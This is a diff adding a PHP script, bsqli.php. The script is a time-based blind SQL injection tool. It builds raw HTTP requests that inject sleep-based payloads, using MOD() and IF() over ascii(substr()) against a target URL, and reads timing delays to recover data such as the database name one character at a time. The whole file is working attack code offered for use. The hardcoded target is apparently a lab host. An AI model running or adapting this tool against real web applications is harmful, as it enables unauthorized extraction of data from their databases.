@@ -1,0 +1,84 @@
+<?php
+/**
+ * @file     bsqli.php
+ * @created  May 30, 2010, 9:27:41 PM
+ * @author   Canberk BOLAT <canberk.bolat at gmail.com>
+ * @license  GNU Public License v2.0 http://www.gnu.org/licenses/gpl-2.0.html
+ * @desc     Time based bsqli tool that use MOD() function and only
+ *           do 2 request for determine each charachter
+ */
+
+function conn2target($addr, $payload, $method, $data, $mode)
+{
+    $addr = str_replace("http://", "", strtolower($addr));
+    $addr = explode("/", $addr, 2);
+    $host = $addr[0];
+    $payload = $addr[1].$payload;
+
+    $conn = fsockopen($host, 80, $errno, $errstr, 30);
+
+    if(!$conn){
+        echo "Error: $errstr (".$errno.")\n";
+        die;
+    }
+
+    if(strtolower($method) == "get") {
+            $pack = "GET /$payload HTTP/1.1\r\n";
+            $pack .= "Host: $host \r\n";
+            $pack .= "Connection: Close \r\n\r\n";
+    } elseif(strtolower($method) == "post") {
+            $pack = "POST /$payload HTTP/1.1\r\n";
+            $pack .= "Host: $host \r\n";
+            $pack .= "Content-type: application/x-www-form-urlencoded\r\n";
+            $pack .= "Content-Length: ".strlen($data)."\r\n";
+            $pack .= "Connection: Close \r\n\r\n";
+            $pack .= $data;
+    }
+
+    fwrite($conn, $pack);
+    $stime = (float)array_sum(explode(' ',microtime()));
+        while(!feof($conn)) {
+            $output .= fgets($conn, 2048);
+        }
+    $ftime = (float)array_sum(explode(' ',microtime()));
+    fclose($conn);
+
+    if ($mode == "time") {
+        return ((int)($ftime-$stime));
+    } else {
+        return $output;
+    }
+}
+
+$chars = array(97 => "6", 98 => "7", 99 => "8", 100 => "9", 101 => "10", 102 => "11",
+               103 => "12", 104 => "0", 105 => "1", 106 => "2", 107 => "3", 108 => "4",
+               109 => "5", 110 => "6", 111 => "7", 112 => "8", 113 => "9", 114 => "10",
+               115 => "11", 116 => "12", 117 => "0", 118 => "1", 119 => "2", 120 => "3",
+               121 => "4", 122 => "5");
+
+echo "Start @ ".date("H:i:s")."\n";
+
+$target = "http://world/pt/sqli.php?id=1";
+$qu = "(SELECT database())";
+$pattern = "we get it";
+$length = 5;
+for ($i = 1; $i < ($length+1); $i++) {
+    $pload = urlencode(" and 1=sleep((MOD(ascii(substr($qu,$i,1)),13)+3))");
+    $res = conn2target($target, $pload, "GET", NULL, "time");
+    $key = array_keys($chars, ($res-3));
+    $totalreq++;
+    $p = urlencode(" and IF((ascii(substr($qu,$i,1))=".$key[0]."),sleep(5),0)");
+    $a = conn2target($target, $p, "GET", NULL, "time");
+    $totalreq++;
+
+    if ($a > 4) {
+        $result .= chr($key[0]);
+    } else {
+        $result .= chr($key[1]);
+    }
+
+}
+echo "Total Request: $totalreq\n";
+echo "Result: $result\n";
+echo "Finish @ ".date("H:i:s")."\n";
+?>
